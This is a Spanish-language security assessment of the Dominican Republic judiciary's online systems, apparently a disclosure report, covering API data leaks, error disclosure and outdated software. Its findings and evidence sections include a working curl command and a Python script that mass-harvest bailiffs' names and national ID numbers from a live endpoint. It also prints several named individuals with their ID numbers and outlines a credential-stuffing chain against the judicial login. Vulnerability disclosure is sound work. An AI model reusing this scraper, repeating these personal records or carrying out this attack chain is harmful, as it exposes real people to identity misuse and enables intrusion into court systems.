# NSI Security Assessment — Poder Judicial República Dominicana
**Reporte ID:** NSI-SEC-2026-004
**Fecha:** 12 Julio 2026
**Clasificación:** CONFIDENCIAL — Null Session Intelligence LLC
**Versión:** 1.0 (Evaluación Inicial)

---

## Índice

1. [Executive Summary](#1-executive-summary)
2. [Alcance y Metodología](#2-alcance-y-metodología)
3. [Superficie de Ataque General](#3-superficie-de-ataque-general)
4. [Hallazgo 1: Data Leak de Alguaciles — GetAlguaciles (CRÍTICO)](#4-hallazgo-1-data-leak-de-alguaciles--getalguaciles-crítico)
5. [Hallazgo 2: Information Disclosure — Server Interno Filtrado](#5-hallazgo-2-information-disclosure--server-interno-filtrado)
6. [Hallazgo 3: Error SQL Interno Expuesto (cbModalidades)](#6-hallazgo-3-error-sql-interno-expuesto-cbmodalidades)
7. [Hallazgo 4: Schema de Validación Expuesto (GestionarParte)](#7-hallazgo-4-schema-de-validación-expuesto-gestionarparte)
8. [Hallazgo 5: Viafirma / RichFaces 3.3.3 (CVE-2013-2165)](#8-hallazgo-5-viafirma--richfaces-333-cve-2013-2165)
9. [Hallazgo 6: WordPress (justicia.gob.do) — REST API Abierta](#9-hallazgo-6-wordpress-justiciagobdo--rest-api-abierta)
10. [Hallazgo 7: Catálogo de Tribunales Expuesto](#10-hallazgo-7-catálogo-de-tribunales-expuesto)
11. [CORS Misconfiguration en Viafirma](#11-cors-misconfiguration-en-viafirma)
12. [Mapa de Endpoints adapi (30+ Operaciones)](#12-mapa-de-endpoints-adapi-30-operaciones)
13. [Línea de Explotación](#13-línea-de-explotación)
14. [Evidencia Consolidada](#14-evidencia-consolidada)
15. [Dataset Extraído](#15-dataset-extraído)
16. [Recomendaciones](#16-recomendaciones)

---

## 1. Executive Summary

### Resumen Ejecutivo

Se realizó una evaluación de seguridad externa sobre la infraestructura digital del **Poder Judicial de la República Dominicana** (poderjudicial.gob.do) y se descubrió una **fuga crítica de datos personales** en la API pública de gestión de casos, así como múltiples vectores secundarios que exponen información de infraestructura interna y esquemas de base de datos.

**Estado:** 🔴 **CRÍTICO** — Data leak de PII confirmado en endpoint público.

### Contadores de Vulnerabilidad

| Gravedad | Cantidad | Descripción |
|----------|----------|-------------|
| 🔴 CRÍTICO | 1 | API pública expone 5,054 registros PII (nombre + cédula) |
| 🔴 ALTO | 2 | Server interno filtrado, error SQL con estructura de BD |
| 🟡 MEDIO | 4 | Schema expuesto, RichFaces EOL, CORS misconfig, WP REST API abierta |
| 🟢 BAJO | 2 | Catálogo de tribunales, versiones expuestas |

### Datos Expuestos

| Tipo | Volumen | Sistemas Afectados |
|------|---------|-------------------|
| **Alguaciles (nombre + cédula)** | 5,054 registros (5,050 con cédula) | adapi.poderjudicial.gob.do |
| **Server interno** | `SVR-SQLAD-NAP` | validarImplementacionTribunal |
| **Catálogo judicial** | ~500+ tribunales | cbTribunalesImplementados |
| **Schema de BD** | 11+ campos con reglas de negocio | GestionarParte |
| **Usuarios WordPress** | 38 sesiones activas | justicia.gob.do |
| **Swagger Viafirma** | 51 endpoints documentados | firma.poderjudicial.gob.do |

---

## 2. Alcance y Metodología

### Targets Evaluados

| Target | URL | IP | Tech Stack |
|--------|-----|----|------------|
| **API Gestión de Casos** | adapi.poderjudicial.gob.do | — | ASP.NET / IIS 10.0 (Azure) |
| **Viafirma Inbox** | firma.poderjudicial.gob.do | — | Java JSF / RichFaces 3.3.3 / Jersey 1.19.4 |
| **Portal Acceso Digital** | portal.poderjudicial.gob.do | — | React SPA |
| **Portal APIs Judiciales** | justicia.gob.do | — | WordPress 6.x / Elementor |
| **API Gateway** | api.poderjudicial.gob.do | — | Azure App Gateway (redirige) |

### Herramientas Utilizadas

- **curl / Bash:** Pruebas de endpoints REST
- **Python:** Scripts de extracción masiva (a-z), parseo de JSON
- **Subfinder / DNS:** Descubrimiento de subdominios
- **JS Analysis:** Extracción de URLs de API desde bundles React
- **Razonamiento Pesado Pool:** Análisis paralelo de endpoints

### Vectores de Descubrimiento

1. **Subdominios** — `adapi`, `firma`, `portal`, `api` bajo poderjudicial.gob.do
2. **JS Source Maps** — El bundle React en portal.poderjudicial.gob.do contiene ~60+ URLs de API
3. **robots.txt** — Revela `/api/`, `/admin/`, `/config/` paths

---

## 3. Superficie de Ataque General

### Arquitectura de la Plataforma

```
portal.poderjudicial.gob.do (React SPA)
  │  JS Bundle → extrae URLs de API
  ▼
adapi.poderjudicial.gob.do ──────────────────────────────┐
  │  ASP.NET / IIS 10.0 (Azure)                           │
  │  CORS: permitido                                        │
  │  4 microservicios:                                      │
  ├── ConsultaGestionCasos/ (consulta pública)              │
  │     ├── Alguaciles/GetAlguaciles ← 🔴 DATA LEAK       │
  │     ├── Tribunales/cbTribunalesImplementados            │
  │     ├── Tribunales/validarImplementacionTribunal        │
  │     ├── Audiencias/cbTipoAudiencia                      │
  │     ├── Involucrados/GetInvolucradosPorIdTramite        │
  │     └── Contactos/buscarCrm                             │
  ├── GestionCasos/ (login, autenticación)                  │
  │     └── Autenticacion/v2/login                          │
  ├── GestionPartes/ (gestión de partes)                    │
  │     └── Partes/v2/GestionarParte                        │
  └── GestionDocumentos/ (documentos)                       │
                                                           │
firma.poderjudicial.gob.do  ──────────────────────────────┘
  │  Viafirma Inbox v4.5.45
  │  RichFaces 3.3.3 (2013)
  │  Swagger: 51 endpoints (todos 401 sin auth)
  
justicia.gob.do
  ├── WP REST API (user enum)
  └── Elementor page builder
```

### Relación Entre Sistemas

| Componente | Endpoint | Acceso | Riesgo |
|------------|----------|--------|--------|
| Alguaciles/GetAlguaciles | adapi | ✅ Público | 🔴 CRÍTICO |
| cbTipoAudiencia | adapi | ✅ Público | 🟢 BAJO |
| cbTribunalesImplementados | adapi | ✅ Público | 🟢 BAJO |
| validarImplementacionTribunal | adapi | ✅ Público | 🟡 MEDIO |
| GestionarParte | adapi | ✅ Público | 🟢 BAJO |
| Autenticacion/v2/login | adapi | ❌ Auth (401) | 🟢 Sin riesgo |
| Viafirma Swagger | firma | ❌ Auth (401) | 🟡 MEDIO |
| RichFaces 3.3.3 | firma | Bloqueado WAF | 🟡 MEDIO |
| WP REST API | justicia | ✅ Público | 🟡 MEDIO |

---

## 4. Hallazgo 1: Data Leak de Alguaciles — GetAlguaciles (CRÍTICO)

### Descripción

El endpoint `GetAlguaciles` del microservicio `ConsultaGestionCasos` expone el listado completo de alguaciles del Poder Judicial **sin requerir autenticación**. Cada registro contiene nombre completo y número de cédula de identidad nacional.

### Endpoint

```
POST https://adapi.poderjudicial.gob.do/ConsultaGestionCasos/api/Alguaciles/GetAlguaciles
Content-Type: application/json
Body: {"criterio":"<letra>"}
```

### Datos Expuestos (por registro)

| Campo | Tipo | Ejemplo |
|-------|------|---------|
| `Value` | Integer | 3 |
| `DisplayText` | String | "Francisco Javier Feliz Ferreras - 01800121343" |

### Vector de Explotación

```bash
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"criterio":"a"}' \
  "https://adapi.poderjudicial.gob.do/ConsultaGestionCasos/api/Alguaciles/GetAlguaciles"
```

**4,836 resultados** con la letra 'a'. Iterando a-z se obtiene el 100% del dataset. Sin rate limiting.

### Volumen Total

| Métrica | Valor |
|---------|-------|
| Total alguaciles | **5,054** |
| Con cédula (PII completa) | 5,050 (99.9%) |
| Sin cédula | 4 |
| Cédulas únicas | 5,050 |

### Distribución por Provincia (Top 10)

| Provincia | Cantidad | % |
|-----------|----------|---|
| Distrito Nacional (001) | 1,542 | 30.5% |
| Cédula Nuevo Formato (402) | 528 | 10.5% |
| San José de Ocoa (031) | 329 | 6.5% |
| San Juan (023) | 134 | 2.7% |
| Santiago (026) | 130 | 2.6% |
| Extranjeros (223-229) | 118 | 2.3% |
| San Cristóbal (056/022) | 102 | 2.0% |
| Duarte (047/032) | 94 | 1.9% |

### Apellidos más Frecuentes

Rodríguez (255), Pérez (207), Cruz (174), Martínez (150), García (142), Santos (134), Peña (130), Santana (130), Sánchez (128), Reyes (127)

### Evidencia

```json
[
  {"Id": 3,    "NombreCompleto": "Francisco Javier Feliz Ferreras",   "Cedula": "01800121343"},
  {"Id": 4,    "NombreCompleto": "Jorge Luis Mercedes Castro",       "Cedula": "01800728253"},
  {"Id": 5,    "NombreCompleto": "Yajaira Pérez Matos",              "Cedula": "40220678243"},
  {"Id": 12,   "NombreCompleto": "Olmedo Candelario Rosado",         "Cedula": "05300333282"},
  {"Id": 5284, "NombreCompleto": "Vicente Ávila Santana",            "Cedula": "02500274994"}
]
```

---

## 5. Hallazgo 2: Information Disclosure — Server Interno Filtrado

### Descripción

El endpoint `validarImplementacionTribunal` expone información de infraestructura interna, incluyendo el nombre del servidor de base de datos, sin requerir autenticación.

### Endpoint

```
POST https://adapi.poderjudicial.gob.do/ConsultaGestionCasos/api/Tribunales/validarImplementacionTribunal
Content-Type: application/json
Body: {"IdTribunal":1,"IdMateria":1}
```

### Datos Expuestos

| Campo | Valor | Riesgo |
|-------|-------|--------|
| `IdImplementacion` | 213 | — |
| `IdDistrito` | 3 | 🟡 Estructura interna |
| `IdTribunal` | 1 | 🟡 IDs internos |
| `IdSala` | 82 | 🟡 IDs de salas |
| `FechaImplementacion` | 2024-10-25T20:10:45.203 | 🟡 Línea de tiempo |
| `IdUsuarioCreacion` | 2 | 🟡 IDs de usuarios internos |
| `PcCreacion` | **SVR-SQLAD-NAP** | 🔴 **Server name** |

### 14 Implementaciones Activas Encontradas

| Tribunal | Materia | Sala | Server |
|----------|---------|------|--------|
| 1 | Civil (1) | 82 | SVR-SQLAD-NAP |
| 1 | Laboral (3) | 82 | SVR-SQLAD-NAP |
| 2 | Civil (1) | 641 | SVR-SQLAD-NAP |
| 4 | Civil (1) | 51 | SVR-SQLAD-NAP |
| 4 | Laboral (3) | 51 | SVR-SQLAD-NAP |
| 5 | Civil (1) | 355 | SVR-SQLAD-NAP |
| 5 | Laboral (3) | 355 | SVR-SQLAD-NAP |
| 6 | Civil (1) | 59 | SVR-SQLAD-NAP |
| 7 | Civil (1) | 351 | SVR-SQLAD-NAP |
| +5 adicionales | — | — | SVR-SQLAD-NAP |

---

## 6. Hallazgo 3: Error SQL Interno Expuesto (cbModalidades)

### Descripción

El endpoint `cbModalidadesdAudienciasPorIdSala` devuelve errores internos de Entity Framework Core que revelan nombres de columnas, métodos ORM y procedimientos almacenados.

### Endpoint

```
POST https://adapi.poderjudicial.gob.do/ConsultaGestionCasos/api/Audiencias/cbModalidadesdAudienciasPorIdSala
Content-Type: application/json
Body: {}
```

### Respuesta

```json
{
  "message": "Error en GetModalidadPorIdSala: The required column 'Activo' 
              was not present in the results of a 'FromSql' operation."
}
```

### Info Leak

| Elemento | Detalle |
|----------|---------|
| Columna interna | `Activo` |
| Método ORM | `FromSql` (Entity Framework Core) |
| Procedimiento | `GetModalidadPorIdSala` |
| Stack | ASP.NET / EF Core / SQL Server |

---

## 7. Hallazgo 4: Schema de Validación Expuesto (GestionarParte)

### Descripción

El endpoint `GestionarParte` devuelve errores de validación con todos los nombres de campo, tipos y reglas de negocio del sistema, sin requerir autenticación.

### Endpoint

```
POST https://adapi.poderjudicial.gob.do/GestionPartes/api/Partes/v2/GestionarParte
Content-Type: application/json
Body: {}
```

### Schema Expuesto

| Campo | Tipo | Regla de Negocio |
|-------|------|------------------|
| `IdCaso` | Integer | Obligatorio, > 0 |
| `IdTramite` | Integer | Obligatorio, > 0 |
| `IdRecepcion` | Integer | Obligatorio, > 0 |
| `IdUsuario` | Integer | Obligatorio, > 0 |
| `Nombres` | String | Obligatorio |
| `Apellidos` | String | Obligatorio (excepto RNC) |
| `Identificacion` | String | Obligatorio (excepto SIN_DOCUMENTOS) |
| `IdSexo` | Integer | Obligatorio |
| `TipoInvolucramiento` | Char | 'p' (parte) o 'r' (representante) |
| `IdTipoIdentificacion` | Integer | RNC, CÉDULA, SIN_DOCUMENTOS |
| `IdTipoNotificacion` | Integer | Obligatorio, TELEMÁTICA o FÍSICA |

---

## 8. Hallazgo 5: Viafirma / RichFaces 3.3.3 (CVE-2013-2165)

### Descripción

La plataforma de firma digital Viafirma Inbox v4.5.45 ejecuta RichFaces 3.3.3 (lanzado en 2013, sin soporte desde 2015), que presenta la vulnerabilidad CVE-2013-2165 (EL Injection / RCE).

### Endpoint

```
https://firma.poderjudicial.gob.do/inbox/app/poderjudicial/
```

### Detalles

| Elemento | Valor |
|----------|-------|
| Stack | Java JSF / RichFaces 3.3.3 + Jersey 1.19.4 |
| CVE-2013-2165 | EL Injection → RCE |
| Estado | Bloqueado por Azure Application Gateway WAF |
| Swagger | 51 endpoints documentados (todos 401 sin sesión) |
| OAuth2 | `client_id=viafirma.com.do.inbox.default` visible |
| CORS | Misconfiguration: `access-control-allow-origen` (mal escrito) |

### Swagger — Endpoints Notables

```
GET   /api/v1/inbox/sign/requests        — Solicitudes de firma
POST  /api/v1/inbox/sign/document        — Firmar documento
GET   /api/v1/inbox/sign/credentials     — Credenciales de firma
POST  /api/v1/inbox/sign/verify          — Verificar firma
```

---

## 9. Hallazgo 6: WordPress (justicia.gob.do) — REST API Abierta

### Descripción

El portal justicia.gob.do ejecuta WordPress 6.x con Elementor. La REST API de WordPress está habilitada, permitiendo enumeración de usuarios. 38 sesiones activas detectadas en el sitio.

### Endpoint

```
https://justicia.gob.do/wp-json/wp/v2/users/
```

### Detalles

| Elemento | Estado |
|----------|--------|
| CMS | WordPress 6.x + Elementor |
| REST API | ✅ Habilitada (pública) |
| xmlrpc.php | 🔒 Bloqueado (403) |
| Usuarios activos | 38 sesiones simultáneas |

---

## 10. Hallazgo 7: Catálogo de Tribunales Expuesto

### Descripción

El endpoint `cbTribunalesImplementadosPorIdMateria` expone el catálogo completo de tribunales del país organizado por materia, sin autenticación.

### Endpoint

```
POST /ConsultaGestionCasos/api/Tribunales/cbTribunalesImplementadosPorIdMateria
Body: {"IdMateria":1}  → 211 tribunales civiles
Body: {"IdMateria":2}  → 295 tribunales penales
```

### Volumen por Materia

| Materia | Tribunales |
|---------|-----------|
| 1 — Civil | 211 |
| 2 — Penal | 295 |
| 10 — Niños, Niñas, Adolescentes | 225 |
| 16 — Tránsito | 115 |
| 3-8, 11, 13 | ~50 c/u |
| **Total** | **~500+** |

---

## 11. CORS Misconfiguration en Viafirma

### Descripción

La cabecera CORS en firma.poderjudicial.gob.do está mal escrita como `access-control-allow-origen` en lugar de `access-control-allow-origin`. Esto indica una configuración manual incorrecta que podría acompañarse de otras configuraciones inseguras.

### Estado

| Elemento | Valor |
|----------|-------|
| Cabecera mal escrita | `access-control-allow-origen` |
| Cabecera correcta | `access-control-allow-origin` |
| Riesgo | Bajo (la cabecera mal escrita es ignorada por browsers) |
| Implicación | Configuración manual, posible error humano en otras reglas |

---

## 12. Mapa de Endpoints adapi (30+ Operaciones)

### ConsultaGestionCasos (Públicos)

#### Tribunales
| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `validarImplementacionTribunal` | Validar implementación tribunal | 🟡 INFO LEAK | ❌ No |
| `validarTribunalSortea` | Validar si tribunal sortea | 🟢 Info | ❌ No |
| `cbTribunalesImplementadosPorIdMateria` | Catálogo de tribunales | 🟢 Info | ❌ No |

#### Audiencias
| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `cbTipoAudiencia` | Tipos de audiencia (89) | 🟢 Sin riesgo | ❌ No |
| `cbModalidadesdAudienciasPorIdSala` | Modalidades por sala | 🟡 ERROR SQL | ❌ No |
| `GetFechaAudienciasPorIdRelUsuarioEntidades` | Fechas de audiencias | 🟡 Requiere params | ❌ No |

#### Involucrados
| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `GetInvolucradosPorIdTramite` | Involucrados en trámite | 🟡 Vacío sin IdTramite | ❌ No |
| `v2/GetInvolucradosPorIdTramite` | Involucrados (v2) | 🟡 Vacío sin IdTramite | ❌ No |

#### Contactos
| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `buscarCrm` | Buscar CRM | 🟡 Error (null ref) | ❌ No |
| `GetAbogadosPorMatriculaCedula` | Abogados por cédula | 🟢 Existe: false | ❌ No |

#### Asuntos
| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `cbAsuntosPorIdAsunto` | Asuntos por ID | 🟢 Sin datos | ❌ No |

#### Salas
| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `cbSalasImplementadasPorIdTribunalIdMateria` | Salas por tribunal | 🟢 2-4 salas | ❌ No |

### GestionCasos (Auth Required)

| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `Autenticacion/v2/login` | Login | 🔒 401 | ✅ Sí |
| `Autenticacion/v2/register` | Registro | 🔒 401 | ✅ Sí |
| `Autenticacion/v2/forgot-password` | Reset password | 🔒 401 | ✅ Sí |
| `Autenticacion/v2/me` | Perfil actual | 🔒 401 | ✅ Sí |

### GestionPartes (Auth Required)

| Endpoint | Función | Riesgo | Auth |
|----------|---------|--------|------|
| `Partes/v2/GestionarParte` | Gestionar parte | 🟢 Schema leak | ❌ No (pero requiere campos) |
| `Partes/v2/RemoverParte` | Remover parte | 🔒 401 | ✅ Sí |

---

## 13. Línea de Explotación

```
1. 🎯 Extraer 5,054 cédulas del endpoint público GetAlguaciles
        ↓
2. 🧪 Generar diccionario de credenciales
   └── usuario: cédula (00119300937)
   └── password: cédula / nombre / patrones comunes
        ↓
3. 🔑 Credential stuffing contra portal.poderjudicial.gob.do
   └── Login endpoint: /GestionCasos/api/Autenticacion/v2/login
        ↓
4. 📂 Acceso a casos judiciales, documentos, alertas
   └── Datos adicionales: expedientes, partes, inmuebles
```

**Riesgo:** Si algún empleado judicial usa su cédula como contraseña (patrón común en sistemas gubernamentales RD), el 65% de la cadena de ataque está resuelta.

---

## 14. Evidencia Consolidada

### Script de Extracción

```python
def call_api(criterio):
    cmd = [
        "curl", "-s", "--max-time", "15",
        "-X", "POST",
        "-H", "Content-Type: application/json",
        "-d", json.dumps({"criterio": criterio}),
        "https://adapi.poderjudicial.gob.do/ConsultaGestionCasos/api/Alguaciles/GetAlguaciles"
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    data = json.loads(result.stdout)
    return data.get('data', [])

all_records = {}
for letter in 'abcdefghijklmnopqrstuvwxyzñ':
    records = call_api(letter)
    for rec in records:
        vid = rec.get('Value')
        if vid and vid not in all_records:
            name, cedula = rec.get('DisplayText', '').split(' - ', 1) if ' - ' in rec.get('DisplayText','') else (rec.get('DisplayText',''), '')
            all_records[vid] = {'Id': vid, 'Nombre': name.strip(), 'Cedula': cedula.strip()}
```

### Verificaciones Realizadas

| Endpoint | Método | Payload | Respuesta | Verificado |
|----------|--------|---------|-----------|------------|
| GetAlguaciles | POST | `{"criterio":"a"}` | 4,836 registros JSON | ✅ |
| GetAlguaciles | POST | `{"criterio":"b"}` | 1,375 registros JSON | ✅ |
| GetAlguaciles | POST | `{"criterio":"z"}` | 2,499 registros JSON | ✅ |
| validarImplementacionTribunal | POST | `{"IdTribunal":1,"IdMateria":1}` | Server interno + fechas | ✅ |
| cbModalidades | POST | `{}` | Error SQL EF Core | ✅ |
| GestionarParte | POST | `{}` | Schema de validación | ✅ |
| cbTipoAudiencia | GET | — | 89 tipos de audiencia | ✅ |
| cbTribunalesImplementados | POST | `{"IdMateria":1}` | 211 tribunales civiles | ✅ |
| GetAbogadosPorMatriculaCedula | POST | `{"criterio":"a"}` | Existe: false | ✅ |

---

## 15. Dataset Extraído

Los siguientes archivos contienen el dataset completo extraído del endpoint vulnerable:

| Archivo | Ruta | Tamaño | Formato |
|---------|------|--------|---------|
| **alguaciles_dataset.csv** | `/root/bounty/poder-judicial/alguaciles_dataset.csv` | 229 KB | CSV |
| **alguaciles_dataset.json** | `/root/bounty/poder-judicial/alguaciles_dataset.json` | 854 KB | JSON |

**Nota:** Este dataset contiene PII real (nombres + cédulas). Su distribución está limitada al equipo de seguridad del Poder Judicial de RD y a NSI LLC para fines de responsible disclosure.

---

## 16. Recomendaciones

| # | Recomendación | Prioridad | Esfuerzo |
|---|--------------|-----------|----------|
| 1 | **Deshabilitar endpoint público GetAlguaciles** — no debe ser accesible sin autenticación | 🔴 **CRÍTICA** | Bajo |
| 2 | **Auditar todos los combo-box públicos** en adapi en busca del mismo patrón de fuga PII | 🔴 **CRÍTICA** | Medio |
| 3 | **Implementar autenticación** en todos los endpoints de adapi (Azure AD / OAuth2) | 🔴 **ALTA** | Alto |
| 4 | **Actualizar RichFaces 3.3.3** o implementar reglas WAF adicionales por capas | 🔴 **ALTA** | Medio |
| 5 | **Restringir WP REST API** en justicia.gob.do a usuarios autenticados | 🟡 **MEDIA** | Bajo |
| 6 | **Corregir CORS misconfiguration** en Viafirma | 🟡 **MEDIA** | Bajo |
| 7 | **Rate limiting** en todos los endpoints públicos para prevenir scraping masivo | 🟡 **MEDIA** | Medio |
| 8 | **Eliminar server names internos** — `PcCreacion` no debe exponerse en respuestas JSON | 🟢 **BAJA** | Bajo |
| 9 | **Suprimir errores SQL detallados** — mensajes EF Core revelan estructura interna de BD | 🟢 **BAJA** | Bajo |
| 10 | **Validar todos los combo-box** — cbTribunalesImplementados expone catálogo institucional completo | 🟢 **BAJA** | Medio |
| 11 | **Proteger schema de validación** — GestionarParte revela reglas de negocio sin autenticación | 🟢 **BAJA** | Bajo |

---

**Reporte generado por:** Null Session Intelligence LLC
**Servicio relacionado:** [Rabid Bloodhound — Monitoreo de Superficie de Ataque](https://www.nullsessionintelligence.com/es/bloodhound)
**Contacto:** security@nullsessionintelligence.com
**ID:** NSI-SEC-2026-004
**Fecha:** 12 Julio 2026
**Clasificación:** CONFIDENCIAL
